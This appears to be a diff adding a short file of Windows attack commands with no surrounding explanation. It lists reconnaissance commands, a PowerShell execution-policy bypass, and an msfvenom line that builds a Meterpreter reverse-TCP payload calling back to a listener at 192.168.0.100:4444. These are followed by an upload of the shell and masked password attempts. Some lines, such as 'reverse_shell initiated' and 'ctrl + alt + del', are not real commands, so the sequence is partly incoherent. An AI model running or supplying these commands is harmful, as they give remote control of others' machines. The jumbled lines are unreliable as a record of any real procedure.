@@ -1,0 +1,9 @@
+whoami && ipconfig /all && netstat -ano
+tasklist
+powershell -exec bypass
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > shell.exe
+upload shell.exe
+reverse_shell initiated
+password: ******** (attempt 1)
+password: ******** (attempt 2)
+ctrl + alt + del
